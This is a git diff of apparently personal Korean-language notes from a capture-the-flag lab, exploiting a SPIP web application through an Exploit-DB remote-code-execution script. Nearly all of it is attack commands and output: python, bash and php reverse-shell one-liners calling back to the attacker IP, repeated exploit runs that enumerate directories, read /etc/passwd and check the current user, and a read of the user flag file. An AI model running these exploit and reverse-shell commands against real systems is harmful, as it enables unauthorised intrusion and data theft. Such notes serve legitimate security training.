@@ -416,9 +416,14 @@ python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.43.1
 # 환경에 따라 bash, nc, python, php 설치 여부가 다르므로 항상 된다는 보장이 없음 -> 다양한 RS 준비
 
 ```sh
-Python,"python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.8.136.212"",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(""/bin/bash"")'"
-Bash,bash -i >& /dev/tcp/10.8.136.212/1234 0>&1
-PHP,"php -r '$sock=fsockopen(""10.8.136.212"",1234);exec(""/bin/sh -i <&3 >&3 2>&3"");'"
+# python3
+"python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.8.136.212"",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(""/bin/bash"")'"
+
+# bash
+bash -i >& /dev/tcp/10.8.136.212/1234 0>&1
+
+# php
+"php -r '$sock=fsockopen(""10.8.136.212"",1234);exec(""/bin/sh -i <&3 >&3 2>&3"");'"
 ```
 
 python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.43.138/spip/spip.php -c "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.8.136.212"",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(""/bin/bash"")'" --verbose
@@ -429,4 +434,148 @@ python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.43.1
 
 python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.43.138/spip/spip.php -c "php -r '$sock=fsockopen(\"10.8.136.212\",1234);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" --verbose
 
+# RH ping test -> failed
+
+tcpdump -i tun0 icmp
 python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.43.138/spip/spip.php -c "ping -c 1 10.8.136.212" --verbose
+
+python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.43.138/spip/spip.php -c "ls" --verbose
+python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.43.138/spip/spip.php -c "pwd" --verbose
+
+/home/think/spip/spip
+
+python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.43.138/spip/spip.php -c "ls /home" --verbose
+think
+python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.43.138/spip/spip.php -c "ls /home/think" --verbose
+spip
+python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.43.138/spip/spip.php -c "ls -al /home/think/spip" --verbose
+
+drwxr-xr-x 11 www-data www-data 4096 Feb 12 2024 .
+drwxr-x--- 5 www-data www-data 4096 Dec 20 2023 ..
+-rwxr-xr-x 1 www-data www-data 7045 Dec 20 2023 CHANGELOG.md
+drwxr-xr-x 3 www-data www-data 4096 Dec 20 2023 IMG
+-rwxr-xr-x 1 www-data www-data 35147 Dec 20 2023 LICENSE
+-rwxr-xr-x 1 www-data www-data 842 Dec 20 2023 README.md
+-rwxr-xr-x 1 www-data www-data 178 Dec 20 2023 SECURITY.md
+-rwxr-xr-x 1 www-data www-data 1761 Dec 20 2023 composer.json
+-rwxr-xr-x 1 www-data www-data 27346 Dec 20 2023 composer.lock
+drwxr-xr-x 3 www-data www-data 4096 Dec 20 2023 config
+drwxr-xr-x 22 www-data www-data 4096 Dec 20 2023 ecrire
+-rwxr-xr-x 1 www-data www-data 4307 Dec 20 2023 htaccess.txt
+-rwxr-xr-x 1 www-data www-data 42 Dec 20 2023 index.php
+drwxr-xr-x 5 www-data www-data 4096 Dec 20 2023 local
+drwxr-xr-x 22 www-data www-data 4096 Dec 20 2023 plugins-dist
+-rwxr-xr-x 1 www-data www-data 3645 Dec 20 2023 plugins-dist.json
+drwxr-xr-x 12 www-data www-data 4096 Dec 20 2023 prive
+-rwxr-xr-x 1 www-data www-data 973 Dec 20 2023 spip.php
+-rwxr-xr-x 1 www-data www-data 1212 Dec 20 2023 spip.png
+-rwxr-xr-x 1 www-data www-data 1673 Dec 20 2023 spip.svg
+drwxr-xr-x 10 www-data www-data 4096 Dec 20 2023 squelettes-dist
+drwxr-xr-x 6 www-data www-data 4096 Nov 9 04:37 tmp
+drwxr-xr-x 6 www-data www-data 4096 Dec 20 2023 vendor
+
+python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.43.138/spip/spip.php -c "cat /etc/passwd" --verbose
+
+# think 1000번인걸로 보아 일반 사용자 계정으로 판단 -> 일반적으로 1000부터 시작함 일반 게스트는, 0-> root 관리자
+
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+\_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+think:x:1000:1000::/home/think:/bin/sh
+
+python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.43.138/spip/spip.php -c "id" --verbose
+
+# 현재 www-data 계정
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.43.138/spip/spip.php -c "ls -al /" --verbose
+
+drwxr-xr-x 1 root root 4096 Dec 20 2023 .
+drwxr-xr-x 1 root root 4096 Dec 20 2023 ..
+-rwxr-xr-x 1 root root 0 Dec 20 2023 .dockerenv
+lrwxrwxrwx 1 root root 7 Oct 3 2023 bin -> usr/bin
+drwxr-xr-x 2 root root 4096 Apr 15 2020 boot
+drwxr-xr-x 5 root root 340 Nov 9 04:36 dev
+drwxr-xr-x 1 root root 4096 Dec 20 2023 etc
+drwxr-xr-x 1 root root 4096 Dec 7 2023 home
+lrwxrwxrwx 1 root root 7 Oct 3 2023 lib -> usr/lib
+lrwxrwxrwx 1 root root 9 Oct 3 2023 lib32 -> usr/lib32
+lrwxrwxrwx 1 root root 9 Oct 3 2023 lib64 -> usr/lib64
+lrwxrwxrwx 1 root root 10 Oct 3 2023 libx32 -> usr/libx32
+drwxr-xr-x 2 root root 4096 Oct 3 2023 media
+drwxr-xr-x 2 root root 4096 Oct 3 2023 mnt
+drwxr-xr-x 2 root root 4096 Oct 3 2023 opt
+dr-xr-xr-x 172 root root 0 Nov 9 04:36 proc
+drwx------ 2 root root 4096 Oct 3 2023 root
+drwxr-xr-x 1 root root 4096 Dec 7 2023 run
+lrwxrwxrwx 1 root root 8 Oct 3 2023 sbin -> usr/sbin
+drwxr-xr-x 2 root root 4096 Oct 3 2023 srv
+dr-xr-xr-x 13 root root 0 Nov 9 04:36 sys
+drwxrwxrwt 1 root root 4096 Nov 9 04:41 tmp
+drwxr-xr-x 1 root root 4096 Oct 3 2023 usr
+drwxr-xr-x 1 root root 4096 Dec 7 2023 var
+
+/var
+
+drwxr-xr-x 1 root root 4096 Dec 7 2023 .
+drwxr-xr-x 1 root root 4096 Dec 20 2023 ..
+drwxr-xr-x 2 root root 4096 Apr 15 2020 backups
+drwxr-xr-x 1 root root 4096 Dec 7 2023 cache
+drwxr-xr-x 1 root root 4096 Dec 7 2023 lib
+drwxrwsr-x 2 root staff 4096 Apr 15 2020 local
+lrwxrwxrwx 1 root root 9 Oct 3 2023 lock -> /run/lock
+drwxr-xr-x 1 root root 4096 Dec 7 2023 log
+drwxrwsr-x 2 root mail 4096 Oct 3 2023 mail
+drwxr-xr-x 2 root root 4096 Oct 3 2023 opt
+lrwxrwxrwx 1 root root 4 Oct 3 2023 run -> /run
+drwxr-xr-x 2 root root 4096 Oct 3 2023 spool
+drwxrwxrwt 2 root root 4096 Oct 3 2023 tmp
+drwxr-xr-x 3 root root 4096 Dec 7 2023 www
+
+# RH python 2차 시도
+
+python3 -m http.server 8000
+
+python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.43.138/spip/spip.php -c "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.8.136.212"",8000));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(""/bin/bash"")'" --verbose
+
+python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.43.138/spip/spip.php -c "bash -i >& /dev/tcp/10.8.136.212/8000 0>&1" --verbose
+
+# 탐색
+
+python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.43.138/spip/spip.php -c "ls -al /home/think" --verbose
+
+drwxr-xr-x 8 think think 4096 Feb 10 2024 .
+drwxr-xr-x 1 root root 4096 Dec 7 2023 ..
+lrwxrwxrwx 1 root root 9 Jun 21 2023 .bash_history -> /dev/null
+-rw-r--r-- 1 think think 220 Nov 14 2023 .bash_logout
+-rw-r--r-- 1 think think 3771 Nov 14 2023 .bashrc
+drwx------ 2 think think 4096 Nov 14 2023 .cache
+drwx------ 3 think think 4096 Dec 8 2023 .config
+drwx------ 3 think think 4096 Feb 10 2024 .gnupg
+drwxrwxr-x 3 think think 4096 Jan 10 2024 .local
+-rw-r--r-- 1 think think 807 Nov 14 2023 .profile
+lrwxrwxrwx 1 think think 9 Feb 10 2024 .python_history -> /dev/null
+drwxr-xr-x 2 think think 4096 Jan 10 2024 .ssh
+lrwxrwxrwx 1 think think 9 Feb 10 2024 .viminfo -> /dev/null
+drwxr-x--- 5 www-data www-data 4096 Dec 20 2023 spip
+-rw-r--r-- 1 root root 35 Feb 10 2024 user.txt
+
+# flag 1
+
+python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.43.138/spip/spip.php -c "cat /home/think/user.txt" --verbose
